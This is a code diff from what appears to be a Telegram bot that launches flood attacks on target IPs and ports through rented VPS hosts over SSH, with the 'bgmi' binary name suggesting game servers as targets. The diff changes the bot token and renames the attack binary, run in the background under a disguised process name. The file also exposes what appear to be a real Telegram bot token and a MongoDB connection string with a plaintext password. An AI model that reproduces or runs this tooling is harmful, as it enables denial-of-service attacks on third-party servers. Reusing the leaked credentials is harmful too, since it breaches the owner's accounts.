@@ -19,7 +19,7 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Telegram API & MongoDB credentials
-TELEGRAM_BOT_TOKEN = "7960283920:AAELkyiArkea-bcQE5C6NvTz0Bymm0CboLg"
+TELEGRAM_BOT_TOKEN = "7960283920:AAF5X11Q9seMI2lQFVAPZSDPSjx8q6WZZr4"
 MONGO_URI = "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny"
 DB_NAME = "daku"
 
@@ -571,7 +571,7 @@ async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, 
                 )
 
             # ✅ Run attack command in background
-            command = f"nohup bash -c 'exec -a bgmi ./bgmi {target_ip} {port} {duration} {thread_count}' > attack.log 2>&1 & echo $! > attack_pid.txt"
+            command = f"nohup bash -c 'exec -a daku ./daku {target_ip} {port} {duration} {pkt_size} {thread_count}' > attack.log 2>&1 & echo $! > attack_pid.txt"
             result = await conn.run(command, check=False)
             logger.info(f"Executing command on {vps_data['ip']}: {command}")
 
